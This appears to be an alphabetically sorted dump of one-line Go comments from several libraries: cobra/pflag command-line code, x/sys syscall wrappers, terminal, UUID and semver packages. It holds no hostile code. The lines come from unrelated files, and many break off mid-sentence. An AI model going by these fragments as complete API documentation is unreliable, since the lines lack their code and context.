// Copyright 2018 Google Inc.  All rights reserved.
// Copyright 2018 The Go Authors. All rights reserved.
// Copyright 2019 The Go Authors. All rights reserved.
// Copyright 2020 The Go Authors. All rights reserved.
// Copyright 2021 Google Inc.  All rights reserved.
// Copyright 2021 The Go Authors. All rights reserved.
// Copyright 2022 The Go Authors. All rights reserved.
// Core returns a new version constructed from only the MAJOR.MINOR.PATCH
// Count returns the number of CPUs in the set s.
// CountP is like Count only takes a shorthand for the flag name.
// CountVar like CountVar only the flag is placed on the CommandLine instead of a given flag set
// CountVarP is like CountVar only take a shorthand for the flag name.
// CreateDeviceInfo method creates a new device information element and adds it as a new member to the specified device information set.
// CreateDisposition flags for NtCreateFile and NtCreateNamedPipeFile.
// CreateOptions flags for NtCreateFile and NtCreateNamedPipeFile.
// Created by cgo -godefs - DO NOT EDIT
// Csops
// CurrentProcess returns the handle for the current process.
// CurrentThread returns the handle for the current thread.
// Currently all targets have either int32 or int64 for Timespec.Sec.
// DACL returns the security descriptor DACL and whether it was defaulted. The dacl return value may be nil
// DER encoded X.509 certificates signed by keys in another keyring. Restrictions
// DEVINST is a handle usually recognized by cfgmgr32 APIs
// DEVPROPGUID specifies a property category.
// DEVPROPID uniquely identifies the property within the property category.
// DEVPROPKEY represents a device property key for a device property in the
// DEVPROPTYPE represents the property-data-type identifier that specifies the
// DICD flags control SetupDiCreateDeviceInfo
// DICS_FLAG specifies the scope of a device property change
// DICS_STATE specifies values indicating a change in a device's state
// DIGCF flags control what is included in the device information set built by SetupDiGetClassDevs
// DI_FLAGS is SP_DEVINSTALL_PARAMS.Flags values
// DI_FLAGSEX is SP_DEVINSTALL_PARAMS.FlagsEx values
// DI_FUNCTION is function type for device installer
// DI_REMOVEDEVICE specifies the scope of the device removal
// DLLError describes reasons for DLL load failures.
// Darwin system calls.
// DebugFlags used to determine which flags have been assigned to which commands
// Defined in asm_solaris_amd64.s.
// Delegate to UUID Value function
// Delete
// Delete everything from the current cursor position to the
// Delete frees ProcThreadAttributeList's resources.
// Delete zero or more spaces and then one or more characters.
// Deprecated
// Deprecated: Use SetOut and/or SetErr instead
// Deprecated: Use libSystem wrappers instead of direct syscalls.
// Deprecated: this package moved to golang.org/x/term.
// Deprecated: use CurrentProcess for the same Handle without the nil
// Deprecated: use CurrentThread for the same Handle without the nil
// Derive extattr namespace and attribute name
// Descriptions are not supported by bash completion.
// DestroyDriverInfoList method deletes a driver list.
// Determine which union variant is present in pp.Addr by checking
// DevInfo holds reference to device information set
// DevInfoData is a device information structure (references a device instance that is a member of a device information set)
// DevInfoListDetailData is a structure for detailed information on a device information set (used for SetupDiGetDeviceInfoListDetail which supersedes the functionality of SetupDiGetDeviceInfoListClass).
// DeviceInstallParams method retrieves device installation parameters for a device information set or a particular device information element.
// DeviceInstanceID method retrieves the instance ID of the device.
// DeviceRegistryProperty method retrieves a specified Plug and Play device property.
// Dir.Mode bits
// Directory completion
// Directory completion from within a directory
// DisableDefaultCmd prevents Cobra from creating a default 'completion' command
// DisableDescriptions turns off all completion descriptions for shells
// DisableFlagParsing disables the flag parsing.
// DisableFlagsInUseLine will disable the addition of [flags] to the usage
// DisableNoDescFlag prevents Cobra from creating the '--no-descriptions' flag
// DisableRandPool disables the randomness pool if it was previously
// DisableSuggestions disables the suggestions based on Levenshtein distance
// Discover the nodes and construct the MIB OID.
// DissociateFd wraps calls to port_dissociate(3c) on file descriptors.
// DissociatePath wraps port_dissociate(3c) for a filesystem path.
// Do the interface allocations only once for common
// Domain constants for DCE Security (Version 2) UUIDs.
// Domain returns the domain for a Version 2 UUID.  Domains are only defined
// Don't count trailing NUL for abstract address.
// Don't mark the flag that is already set as hidden because it may be an
// DragonFly BSD system calls.
// DriverInfoDetail method retrieves driver information detail for a device information set or a particular device information element in the device information set.
// DrvInfoDetailData is driver information details structure (provides detailed information about a particular driver information structure)
// Dummy function: there are no semantics for Madvise on z/OS
// E.g.  'go run ...' - 'run' is the command. Cobra requires
// EIO is allowed by getdirentries.
// EIO was allowed by getdirentries.
// EPOLLET        = 0x80000000
// EPOLLEXCLUSIVE = 0x10000000 // Exclusive wake-up mode
// EPOLLONESHOT   = 0x40000000
// EPOLLRDHUP     = 0x2000     // Typically used with edge-triggered notis
// EPOLLWAKEUP    = 0x20000000 // Relies on Linux's BLOCK_SUSPEND capability
// EPOLL_CLOEXEC  = 0x80000
// ERROR_OBJECT_NOT_FOUND.
// Each time this is called is a single new entry
// Empty string would cause a slice with one (empty) entry
// EnablePrefixMatching allows to set automatic prefix matching. Automatic prefix matching can be a dangerous thing
// EnableRandPool enables internal randomness pool used for Random
// Enforce flag groups before doing flag completions
// EnumDeviceInfo method returns a DevInfoData structure that specifies a device information element in a device information set.
// EnumDriverInfo method enumerates the members of a driver list.
// EpollCtlOld
// EpollPwait
// EpollWaitOld
// Eq takes two types and checks whether they are equal. Supported types are int and string. Unsupported types will panic.
// Equal tests if two versions are equal.
// Equals compares Constraints with other Constraints
// Equals compares two SIDs for equality.
// Erase the character under the current position.
// Erases the screen and moves the cursor to the home position.
// ErrHelp is the error returned if the flag -help is invoked but no such flag is defined.
// ErrOrStderr returns output to stderr
// ErrUnsupported is returned if a function is not
// Errno values.
// ErrnoName returns the error name for error number e.
// Error table
// Error while attempting to parse flags
// ErrorHandling defines how to handle flag parsing errors.
// Errors
// Escape contains a pointer to the escape codes for this terminal.
// EscapeArg rewrites command line argument s as prescribed
// EscapeCodes contains escape sequences that can be written to the terminal in
// Event Ports
// EventPort provides a safe abstraction on top of Solaris/illumos Event Ports.
// ExactArgs returns an error if there are not exactly n args.
// ExactValidArgs returns an error if
// Example is examples of how to use the command.
// Example: add [-F file 
// Exclude the null terminator
// Execute executes the root command.
// Execute method is called.
// Execute uses the args (os.Args[1:] by default)
// ExecuteC executes the command.
// Execve
// Existing constants on linux
// ExitOnError will call os.Exit(2) if an error is found when parsing
// Expected arguments
// FILE_INFO_BY_HANDLE_CLASS constants for SetFileInformationByHandle/GetFileInformationByHandleEx
// FIXME Eq is unused by cobra and should be removed in a version 2. It exists only for compatibility with users of cobra.
// FIXME Gt is unused by cobra and should be removed in a version 2. It exists only for compatibility with users of cobra.
// FIXME appendIfNotPresent is unused by cobra and should be removed in a version 2. It exists only for compatibility with users of cobra.
// FParseErrWhitelist configures Flag parse errors to be ignored
// FParseErrWhitelist flag parse errors to be ignored
// Fchmod_extended
// FcntlFstore performs a fcntl syscall for the F_PREALLOCATE command.
// FcntlInt performs a fcntl syscall on fd with the provided command and argument.
// Fcntl_nocancel
// FdIsWatched checks to see if fd is associated with this EventPort.
// Fgetxattr
// Fhopen
// Fields may not be an exact match. Some fields have no equivalent.
// File completion filtered by extensions
// File system flags from GetVolumeInformation and GetVolumeInformationByHandle.
// FileHandle represents the C struct file_handle used by
// FileInformationClass for NtSetInformationFile
// Fill in parameter list.
// Final argument is (basep 
// Finally trim the completion.  This is especially important to get rid
// Find NUL terminator.
// Find home directory.
// Find nwmTCPStatsEntry in returned entries
// Find searches DLL for procedure named p.Name. It returns
// Find size.
// Find the base of the mapping.
// Find the completion function for the flag or command
// Find the real command for which completion must be performed
// Find the target command given the args and command tree
// FindProc searches DLL d for procedure named name and returns 
// FindProcByOrdinal searches DLL d for procedure by ordinal and returns 
// FindResource resolves a resource of the given name and resource type.
// First __DragonFly_version after September 2019 ABI changes
// First check for required flags
// First convert the short flag into a long flag
// FixedCompletions can be used to create a completion function which always
// Flag climbs up the command tree looking for matching flag.
// Flag for QueryFullProcessImageName.
// Flag has full name
// Flag indicates that device is disabled
// Flag is shorthand
// Flag that causes SetupDiBuildDriverInfoList to build a device's compatible driver
// Flag that prevents ConfigMgr from removing/re-enumerating devices during device
// Flag to indicate that only the the INF specified by SP_DEVINSTALL_PARAMS.DriverPath should be searched.
// Flag to indicate that the sorting from the INF file should be used.
// Flag to indicate the setting properties for this Device (or class) caused a change so the Dev Mgr UI probably needs to be updated.
// Flag with an =
// Flag without the =
// FlagErrorFunc returns either the function set by SetFlagErrorFunc for this
// FlagUsages returns a string containing the usage information for all flags in
// FlagUsagesWrapped returns a string containing the usage information
// Flags added to the FlagSet will be translated and then when anything tries to
// Flags for DefineDosDevice.
// Flags for Device/Class Properties
// Flags for FILE_CASE_SENSITIVE_INFORMATION
// Flags for FILE_DISPOSITION_INFORMATION_EX
// Flags for FILE_LINK_INFORMATION
// Flags for FILE_RENAME_INFORMATION
// Flags for LockFileEx.
// Flags for WSASocket
// Flags for choosing a device
// Flags for device installation
// Flags returned by DiInstallDevice to indicate need to reboot/restart
// Flags returns the complete FlagSet that applies
// Flags set by DiBuildDriverInfoList
// Flags used for GetModuleHandleEx
// Flistxattr
// For MessageBox()
// For a given domain/id pair the same token may be returned for up to
// For details of the functions and data types in this package consult
// For example:
// For internal use.
// For more information see pledge(2).
// For more information see unveil(2).
// For testing: clients can set this flag to force
// Foreground colors
// Fork
// FreeBSD and NetBSD implement their own syscalls to handle extended attributes
// FreeBSD system calls.
// FreeBSD won't allow you to list xattrs from multiple namespaces
// Fremovexattr
// FromBytes creates a new UUID from a byte slice. Returns an error if the slice
// Fsctl
// Fsetxattr
// Fstat64_extended
// Fstat_extended
// Fstypename
// Fsync_nocancel
// FullPath retrieves the full path of the specified file.
// Functions to access/create device major and minor numbers matching the
// Futex
// GUIDFromString parses a string in the form of
// GenBashCompletion generates bash completion file and writes to the passed writer.
// GenBashCompletionFile generates bash completion file.
// GenBashCompletionFileV2 generates Bash completion version 2.
// GenBashCompletionV2 generates Bash completion file version 2
// GenFishCompletion generates fish completion file and writes to the passed writer.
// GenFishCompletionFile generates fish completion file.
// GenPowerShellCompletion generates powershell completion file without descriptions
// GenPowerShellCompletionFile generates powershell completion file without descriptions.
// GenPowerShellCompletionFileWithDesc generates powershell completion file with descriptions.
// GenPowerShellCompletionWithDesc generates powershell completion file with descriptions
// GenZshCompletion generates zsh completion file including descriptions
// GenZshCompletionFile generates zsh completion file including descriptions.
// GenZshCompletionFileNoDesc generates zsh completion file without descriptions.
// GenZshCompletionNoDesc generates zsh completion file without descriptions
// GenerateGUID creates a new random GUID.
// GenericReparseBuffer
// Get CEECAATHDID
// Get __errno FuncDesc.
// Get a list of all sysctl nodes below the given MIB by performing
// Get function.
// Get library control area (LCA).
// Get wraps port_getn(3c) and fills a slice of PortEvent.
// GetActiveHelpConfig returns the value of the ActiveHelp environment variable
// GetBool return the bool value of a flag with the given name
// GetBoolSlice returns the []bool value of a flag with the given name.
// GetBytesBase64 return the []byte value of a flag with the given name
// GetBytesHex return the []byte value of a flag with the given name
// GetConnectionDetail EZBNMIF4 call
// GetCount return the int value of a flag with the given name
// GetCurrentProcess returns the handle for the current process.
// GetCurrentProcessToken returns the access token associated with
// GetCurrentThread returns the handle for the current thread.
// GetCurrentThreadEffectiveToken returns the effective access token
// GetCurrentThreadToken return the access token associated with
// GetDuration return the duration value of a flag with the given name
// GetDurationSlice returns the []time.Duration value of a flag with the given name
// GetFloat32 return the float32 value of a flag with the given name
// GetFloat32Slice return the []float32 value of a flag with the given name
// GetFloat64 return the float64 value of a flag with the given name
// GetFloat64Slice return the []float64 value of a flag with the given name
// GetGlobalStats EZBNMIF4 call
// GetIP return the net.IP value of a flag with the given name
// GetIPNet return the net.IPNet value of a flag with the given name
// GetIPSlice returns the []net.IP value of a flag with the given name
// GetIPv4Mask return the net.IPv4Mask value of a flag with the given name
// GetInt return the int value of a flag with the given name
// GetInt16 returns the int16 value of a flag with the given name
// GetInt32 return the int32 value of a flag with the given name
// GetInt32Slice return the []int32 value of a flag with the given name
// GetInt64 return the int64 value of a flag with the given name
// GetInt64Slice return the []int64 value of a flag with the given name
// GetInt8 return the int8 value of a flag with the given name
// GetIntSlice return the []int value of a flag with the given name
// GetKernelSyms
// GetMempolicy
// GetNamedSecurityInfo queries the security information for a given named object and returns the self-relative security
// GetNormalizeFunc returns the previously set NormalizeFunc of a function which
// GetOne wraps port_get(3c) and returns a single PortEvent.
// GetProcAddressByOrdinal retrieves the address of the exported
// GetProcessPreferredUILanguages retrieves the process preferred UI languages.
// GetRobustList
// GetSecurityInfo queries the security information for a given handle and returns the self-relative security
// GetSize returns the dimensions of the given terminal.
// GetSize returns the visible dimensions of the given terminal.
// GetSlice returns the flag value list as an array of strings.
// GetState returns the current state of a terminal which may be useful to
// GetString return the string value of a flag with the given name
// GetStringArray return the []string value of a flag with the given name
// GetStringSlice return the []string value of a flag with the given name
// GetStringToInt return the map[string]int value of a flag with the given name
// GetStringToInt64 return the map[string]int64 value of a flag with the given name
// GetStringToString return the map[string]string value of a flag with the given name
// GetSystemDirectory retrieves the path to current location of the system
// GetSystemPreferredUILanguages retrieves the system preferred UI languages.
// GetSystemWindowsDirectory retrieves the path to current location of the
// GetThreadArea
// GetThreadPreferredUILanguages retrieves the thread preferred UI languages for the current thread.
// GetTime returns the current Time (100s of nanoseconds since 15 Oct 1582) and
// GetTokenGroups retrieves group accounts associated with access token t.
// GetTokenPrimaryGroup retrieves access token t primary group information.
// GetTokenUser retrieves access token t user account information.
// GetUint return the uint value of a flag with the given name
// GetUint16 return the uint16 value of a flag with the given name
// GetUint32 return the uint32 value of a flag with the given name
// GetUint64 return the uint64 value of a flag with the given name
// GetUint8 return the uint8 value of a flag with the given name
// GetUintSlice returns the []uint value of a flag with the given name.
// GetUserPreferredUILanguages retrieves information about the user preferred UI languages.
// GetUserProfileDirectory retrieves path to the
// GetWindowsDirectory retrieves the path to current location of the Windows
// Getattrlist
// Getaudit
// Getaudit_addr
// Getauid
// Getcwd will return an error if it failed for any reason.
// Getdents
// Getdirentriesattr
// Getfh
// Getitimer wraps getitimer(2) to return the current value of the timer
// Getlogin
// Getpmsg
// Getrlimit prefers the prlimit64 system call. See issue 38604.
// Getsgroups
// Getsize returns the number of rows (lines) and cols (positions
// GetsizeFull returns the full terminal size description.
// GetsockoptString returns the string value of the socket option opt for the
// GetsockoptXucred is a getsockopt wrapper that returns an Xucred struct.
// Gettid
// Getwgroups
// Getxattr
// Global map of flag completion functions. Make sure to use flagCompletionMutex before you try to read and write from it.
// GlobalNormalizationFunc returns the global normalization function or nil if it doesn't exist.
// Go custom completion defined for this flag or command.
// Go implementation of C mostly found in /usr/src/sys/kern/subr_capability.c
// Go to C does not support varargs functions.
// GreaterThan tests if this version is greater than another version.
// GreaterThanOrEqual tests if this version is greater than or equal to another version.
// Group attributes inside of Tokengroups.Groups[i].Attributes
// Group returns the security descriptor group and whether it was defaulted.
// HSPFILEQ is type for setup file queue
// Hand edited based on zerrors_linux_s390x.go
// Hand edited based on ztypes_linux_s390x.go
// Handle pty size.
// Handle returns d's module handle.
// HasAlias determines if a given string is an alias of the command.
// HasAvailableFlags checks if the command contains any flags (local plus persistent from the entire
// HasAvailableFlags returns a bool to indicate if the FlagSet has any flags
// HasAvailableInheritedFlags checks if the command has flags inherited from its parent command which are
// HasAvailableLocalFlags checks if the command has flags specifically declared locally which are not hidden
// HasAvailablePersistentFlags checks if the command contains persistent flags which are not hidden or deprecated.
// HasAvailableSubCommands determines if a command has available sub commands that
// HasExample determines if the command has example.
// HasFlags checks if the command contains any flags (local plus persistent from the entire structure).
// HasFlags returns a bool to indicate if the FlagSet has any flags defined.
// HasHelpSubCommands determines if a command has any available 'help' sub commands
// HasInheritedFlags checks if the command has flags inherited from its parent command.
// HasLocalFlags checks if the command has flags specifically declared locally.
// HasParent determines if the command is a child command.
// HasPersistentFlags checks if the command contains persistent flags.
// HasSubCommands determines if the command has children commands.
// Hash an input string and read the results. Each Write discards
// Hash the contents of a file.
// Help puts out the help for the command.
// Help template generation.
// HelpFunc returns either the function set by SetHelpFunc for this command
// HelpTemplate return help template for the command.
// Helpers for dealing with ifreq since it contains a union and thus requires a
// Here is an example of using an AF_ALG socket with SHA1 hashing.
// HiddenDefaultCmd makes the default 'completion' command hidden
// I am scared that if we don't include the 
// I think because the 5-register system call interface can't handle
// ID returns the id for a Version 2 UUID. IDs are only defined for Version 2
// IFT_CARP is deprecated in FreeBSD 10
// INO64_FIRST from /usr/src/lib/libc/sys/compat-ino64.h
// IPNet adapts net.IPNet for use as a flag.
// IPV6_RECVORIGDSTADDR option must be enabled on the socket.
// IdentifierAuthority returns the identifier authority of the SID.
// Identitysvc
// If '--flag arg' then
// If '-f arg' then
// If TraverseChildren is true on the root command we don't check for
// If error type is flagCompError and we don't want flagCompletion we should ignore the error
// If pid is 0 the calling thread is used.
// If r.Read returns an error when the package requests random data then
// If s contains a NUL byte this function panics instead of
// If still not enough space then don't even try to wrap.
// If the 
// If the IPC_CREAT flag is specified a new segment is created.
// If the path is no longer associated with this event port (ENOENT)
// If the terminal expands then our position calculations will
// If the width didn't change then nothing else needs to be
// If this is true all flags will be passed to the command as arguments.
// If time has gone backwards with this clock sequence then we
// IfreqMTU is struct ifreq used to get or set a network device's MTU.
// Ignore errors
// Impersonation levels
// Implemented in assembly to avoid allocation.
// Implemented in assembly to import from runtime.
// Implemented in runtime/syscall_aix.go.
// Implemented in runtime/syscall_solaris.go.
// Implemented in the runtime package (runtime/sys_darwin.go)
// InOrStdin returns input to stdin
// Including linux/l2tp.h here causes conflicts between linux/in.h
// Indicates an error occurred and completions should be ignored.
// Indicates that only directory names should be provided in file completion.
// Indicates that the returned completions should be used as file extension filters.
// Indicates that the shell should not provide file completion even when
// Indicates that the shell will perform its default behavior after completions
// Inet4Addr returns the Ifreq union data from an embedded sockaddr as a C
// Information about these APIs can be found at:
// InheritSize applies the terminal size of pty to tty. This should be run
// InheritedFlags returns all flags which were inherited from parent commands.
// Init sets the name and error handling property for a flag set.
// InitDefaultHelpCmd adds default help command to c.
// InitDefaultHelpFlag adds default help flag to c.
// InitDefaultVersionFlag adds default version flag to c.
// Initgroups
// Interior.
// Invented structures to support what package os expects.
// Invented values to support what package os expects.
// IoCancel
// IoDestroy
// IoGetevents
// IoSetup
// IoSubmit
// Ioctl
// IoctlFileClone performs an FICLONE ioctl operation to clone the entire file
// IoctlFileCloneRange performs an FICLONERANGE ioctl operation to clone the
// IoctlFileDedupeRange performs an FIDEDUPERANGE ioctl operation to share the
// IoctlGetEthtoolDrvinfo fetches ethtool driver information for the network
// IoctlGetEthtoolDrvinfo which use these APIs under the hood.
// IoctlGetIfreqMTU performs the SIOCGIFMTU ioctl operation on fd to get the MTU
// IoctlGetInt performs an ioctl operation which gets an integer value
// IoctlGetTermios performs an ioctl on fd with a 
// IoctlGetWatchdogInfo fetches information about a watchdog device from the
// IoctlIfreq performs an ioctl using an Ifreq structure for input and/or
// IoctlKCMAttach attaches a TCP socket and associated BPF program file
// IoctlKCMClone attaches a new file descriptor to a multiplexor by cloning an
// IoctlKCMUnattach unattaches a TCP socket file descriptor from a multiplexor.
// IoctlRetInt performs an ioctl operation specified by req on a device
// IoctlSetIfreqMTU performs the SIOCSIFMTU ioctl operation on fd to set the MTU
// IoctlSetInt performs an ioctl operation which sets an integer value
// IoctlSetPointerInt performs an ioctl operation which sets an
// IoctlSetTermios performs an ioctl on fd with a 
// IoctlSetWinsize performs an ioctl on fd with a 
// IoctlWatchdogKeepalive issues a keepalive ioctl to a watchdog device. For
// Iopolicysys
// IoprioGet
// IoprioSet
// IsAdditionalHelpTopicCommand determines if a command is an additional
// IsAvailableCommand determines if a command is available as a non-help command
// IsCompatible method tests if given hardware ID matches the driver or is listed on the compatible ID list.
// IsElevated returns whether the current token is elevated from a UAC perspective.
// IsInvalidLengthError is matcher function for custom error invalidLengthError
// IsMember reports whether the access token t is a member of the provided SID.
// IsNewer method returns true if DrvInfoData date and version is newer than supplied parameters.
// IsRestricted reports whether the access token t is a restricted token.
// IsSet reports whether cpu is in the set s.
// IsSet returns whether fd is in the set fds.
// IsTerminal returns whether the given file descriptor is a terminal.
// IsValid returns whether the SID has a valid revision and length.
// IsValid returns whether the security descriptor is valid.
// IsWellKnown determines whether the SID matches the well-known sidType.
// It cannot be used safely or portably and its representation may change in a later release.
// It delays the lookup until the Addr method is called.
// It does not guarantee that the program was run from a terminal. It only can tell you
// It implements the os.Signal interface.
// It is a dynamic version of using ValidArgs.
// It is a pseudo handle that does not need to be closed.
// It is called automatically by executing the c or by calling help and usage.
// It is called automatically by executing the c.
// It is conservative and returns false if any of the internal calls fail.
// It is not safe to use the slice after calling this function.
// It is possible we will add more fields to 
// It is recommended to instead use c.RegisterFlagCompletionFunc(...) which allows
// It returns the previous value of the timer.
// It returns the string with the remaining slice of b and a boolean. If the length is
// It simplifies safe initialization of global variables holding compiled UUIDs.
// It visits only those flags that have been set.
// It will block until either min events have been received
// It will delay the load of the DLL until the first
// It will panic if the procedure cannot be found.
// It won't handle assigning the results of lseek to 
// It's only when dest is set to NULL that the OS X implementations of
// JobObjectInformationClass
// Just jump to package syscall's implementation for all these functions.
// Kdebug_trace
// Keep going for multiple reasons:
// Keep in sync with the size of the referenced fields.
// KexecLoad
// Keyctl Commands (http://man7.org/linux/man-pages/man2/keyctl.2.html)
// Keyctl commands with special signatures.
// KeyctlBuffer calls keyctl commands in which the third and fourth
// KeyctlDHCompute implements the KEYCTL_DH_COMPUTE command. This command
// KeyctlGetKeyringID implements the KEYCTL_GET_KEYRING_ID command.
// KeyctlInstantiateIOV implements the KEYCTL_INSTANTIATE_IOV command. This
// KeyctlInt calls keyctl commands in which each argument is an int.
// KeyctlJoinSessionKeyring implements the KEYCTL_JOIN_SESSION_KEYRING command.
// KeyctlRestrictKeyring implements the KEYCTL_RESTRICT_KEYRING command. This
// KeyctlSearch implements the KEYCTL_SEARCH command.
// KeyctlSetperm implements the KEYCTL_SETPERM command. The perm value is the
// KeyctlString calls keyctl commands which return a string.
// Klogset wraps the sys_syslog system call
// Kqueue_from_portset_np
// Kqueue_portset
// LazyProc's Addr method.
// Leading edge.
// Leading edge. PEEKTEXT/PEEKDATA don't require aligned
// Leave room for NUL byte terminator.
// Leave room for terminating NULL byte.
// Legacy arg validation has the following behaviour:
// Length returns the length of the security descriptor.
// LessThan tests if this version is less than another version.
// LessThanOrEqual tests if this version is less than or equal to another version.
// Let's be nice and avoid making users have to do that.
// Lifreq Helpers
// Linux fchmodat doesn't support the flags parameter. Mimick glibc's behavior
// Linux system calls.
// Lio_listio
// List returns the actual ProcThreadAttributeList to be passed to StartupInfoEx.
// Listxattr
// Load loads DLL file d.Name into memory. It returns an error if fails.
// LoadDLL loads DLL file into memory.
// LoadLibrary flags for determining from where to search for a DLL
// LocalFlags returns the local FlagSet specifically set in the current command.
// LocalNonPersistentFlags are flags specific to this command which will NOT persist to subcommands.
// Long is the long message shown in the 'help <this-command>' output.
// Looks like golang flags don't set DefValue correctly  :-(
// LookupAccount retrieves the name of the account for this SID
// LookupDcookie
// LookupSID retrieves a security identifier SID for the account
// Lstat64_extended
// Lstat_extended
// Lutimes sets the access and modification times tv on path. If path refers to
// MACHINE GENERATED BY THE ABOVE COMMAND
// MUI function flag values
// Major returns the major component of a Darwin device number.
// Major returns the major component of a DragonFlyBSD device number.
// Major returns the major component of a FreeBSD device number.
// Major returns the major component of a Linux device number.
// Major returns the major component of a NetBSD device number.
// Major returns the major component of a z/OS device number.
// Major returns the major component of an OpenBSD device number.
// Make a bigger buffer if needed
// Make sure the completion script calls the __
// Make sure to close the pty at the end.
// Make sure we only write the first line to the output.
// MakeItimerval creates an Itimerval from interval and value durations.
// MakeRaw puts the terminal connected to the given file descriptor into raw
// Map the requested memory.
// MarkDeprecated indicated that a flag is deprecated in your program. It will
// MarkFlagDirname instructs the various shell completion implementations to
// MarkFlagFilename instructs the various shell completion implementations to
// MarkFlagRequired instructs the various shell completion implementations to
// MarkFlagsMutuallyExclusive marks the given flags with annotations so that Cobra errors
// MarkFlagsRequiredTogether marks the given flags with annotations so that Cobra errors
// MarkHidden sets a flag to 'hidden' in your program. It will continue to
// MarkPersistentFlagDirname instructs the various shell completion
// MarkPersistentFlagFilename instructs the various shell completion
// MarkPersistentFlagRequired instructs the various shell completion implementations to
// MarkShorthandDeprecated will mark the shorthand of a flag deprecated in your
// MarkZshCompPositionalArgumentFile only worked for zsh and its behavior was
// MarkZshCompPositionalArgumentWords only worked for zsh. It has therefore
// Marshal encodes a 9P stat message corresponding to d into b
// MarshalBinary implements encoding.BinaryMarshaler.
// MarshalJSON implements json.Marshaler.
// MarshalText implements encoding.TextMarshaler interface.
// MarshalText implements encoding.TextMarshaler.
// MatchAll allows combining several PositionalArgs to work in concert.
// Max lengths of commands' string lengths for use in padding.
// Maximum string length constants
// MaximumNArgs returns an error if there are more than N args.
// Mbind
// Meant to be run on the highest node. Only searches down.
// Metadata returns any metadata that was part of the version
// Microsoft encoding {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} and the raw hex
// MigratePages
// Mincore
// Minherit
// MinimumNArgs returns an error if there is not at least N args.
// Minor gives a cookie instead of an index since in order to avoid changing the
// Minor returns the minor component of a Darwin device number.
// Minor returns the minor component of a DragonFlyBSD device number.
// Minor returns the minor component of a FreeBSD device number.
// Minor returns the minor component of a Linux device number.
// Minor returns the minor component of a NetBSD device number.
// Minor returns the minor component of a z/OS device number.
// Minor returns the minor component of an OpenBSD device number.
// Mkdev returns a Darwin device number generated from the given major and minor
// Mkdev returns a DragonFlyBSD device number generated from the given major and
// Mkdev returns a FreeBSD device number generated from the given major and
// Mkdev returns a Linux device number generated from the given major and minor
// Mkdev returns a NetBSD device number generated from the given major and minor
// Mkdev returns a z/OS device number generated from the given major and minor
// Mkdev returns an OpenBSD device number generated from the given major and minor
// Mkdir_extended
// Mkfifo_extended
// Mntfromname
// Mntonname
// ModifyLdt
// Modwatch
// More invented values for signals
// Mount
// Mount and bind flags
// MountSetattr is a wrapper for mount_setattr(2).
// MousetrapDisplayDuration controls how long the MousetrapHelpText message is displayed on Windows
// MousetrapHelpText enables an information splash screen on Windows
// Move back to beginning.
// Move cursor to column zero at the start of the line.
// Move down a line
// MovePages
// MqGetsetattr
// MqNotify
// MqOpen
// MqTimedreceive
// MqTimedsend
// MqUnlink
// Mremap
// Msgctl
// Msgget
// Msgrcv
// Msgrcv_nocancel
// Msgsnd
// Msgsnd_nocancel
// Msgsys
// Must be > 0.
// Must be called while holding ep.mu
// Must is a helper that wraps a call to a function returning (
// Must print to stderr for this not to be read by the completion script.
// Must returns uuid if err is nil and panics otherwise.
// MustConstraints is a helper that wraps a call to a function
// MustFindProc is like FindProc but panics if search fails.
// MustFindProcByOrdinal is like FindProcByOrdinal but panics if search fails.
// MustLoadDLL is like LoadDLL but panics if load operation failes.
// MustParse is like Parse but panics if the string cannot be parsed.
// NArg is the number of arguments remaining after flags have been processed.
// NFlag returns the number of command-line flags that have been set.
// NFlag returns the number of flags that have been set.
// NOTE(brainman): work around ERROR_BROKEN_PIPE is returned on reading EOF from stdin
// NOTE(rsc): It seems strange to set the buffer to have
// NOTE(rsc): The Win32finddata struct is wrong for the system call:
// NOTE: Always call this function while holding the e.mu mutex
// NOTE: Usage is not just defaultUsage(CommandLine)
// NT APIs that work over the NTString type. Note that most Windows APIs
// NT APIs that work over the NTUnicodeString type. Note that most Windows APIs
// NT Native APIs
// Name returns the command's name: the first word in the use line.
// Name returns the interface name associated with the Ifreq.
// NameAndAliases returns a list of the command name and all aliases
// NamePadding returns padding for the name.
// NameToHandleAt wraps the name_to_handle_at system call
// Nano returns the time stored in ts as nanoseconds.
// Nano returns the time stored in tv as nanoseconds.
// Nanoseconds returns Filetime ft in nanoseconds
// Needed since <sys/param.h> refers to it...
// NetBSD aarch64 requires 128-bit alignment.
// NetBSD and OpenBSD armv7 require 64-bit alignment.
// NetBSD system calls.
// New creates a new random UUID or panics.  New is equivalent to
// NewCallback converts a Go function to a function pointer conforming to the stdcall calling convention.
// NewCallbackCDecl converts a Go function to a function pointer conforming to the cdecl calling convention.
// NewConstraint will parse one or more constraints from the given
// NewDCEGroup returns a DCE Security (Version 2) UUID in the group
// NewDCEPerson returns a DCE Security (Version 2) UUID in the person
// NewDCESecurity returns a DCE Security (Version 2) UUID.
// NewEventPort creates a new EventPort including the
// NewFileHandle constructs a FileHandle.
// NewHash returns a new UUID derived from the hash of space concatenated with
// NewIfreq creates an Ifreq with the input network interface name after
// NewLazyDLL creates new LazyDLL associated with DLL file.
// NewLine prints a new line to the terminal with no content
// NewMD5 and NewSHA1.
// NewMD5 returns a new MD5 (Version 3) UUID based on the
// NewNTString returns a new NTString structure for use with native
// NewNTUnicodeString returns a new NTUnicodeString structure for use with native
// NewParser creates a new parser that writes to w
// NewProc returns a LazyProc for accessing the named procedure in the DLL d.
// NewRandom returns a Random (Version 4) UUID.
// NewRandomFromReader returns a UUID based on bytes read from a given io.Reader.
// NewSHA1 returns a new SHA1 (Version 5) UUID based on the
// NewSecurityDescriptor creates and initializes a new absolute security descriptor.
// NewSemver parses the given version and returns a new
// NewString creates a new random UUID and returns it as a string or panics.
// NewString is equivalent to the expression
// NewTerminal runs a VT100 terminal on the given ReadWriter. If the ReadWriter is
// NewUUID returns a Version 1 UUID based on the current NodeID and clock
// NewVersion parses the given version and returns a new
// Nfsclnt
// Nfsservctl
// Nfssvc
// NoArgs returns an error if any args are included.
// NoFileCompletions can be used to disable file completion for commands that should
// Node ID is not set.
// Node ID will be generated.  If a named interface cannot be found then false
// NodeID returns the 6 byte node id encoded in uuid.  It returns nil if uuid is
// NodeInterface returns the name of the interface from which the NodeID was
// Non-racy version of:
// NonInheritedFlags returns all flags which were not inherited from parent commands.
// Normal flag completion
// NormalizedName is a flag name that has been normalized according to rules
// Normally terminals will advance the current position
// Not as efficient as it could be because Timespec and
// Not doing flag completion
// Not enough room. Return for now.
// Not enough space for sensible wrapping. Wrap as a block on
// Not implemented
// Note that SPDRP codes are zero based while CM_DRP codes are one based!
// Note that completion printouts should never be on stdout as they would
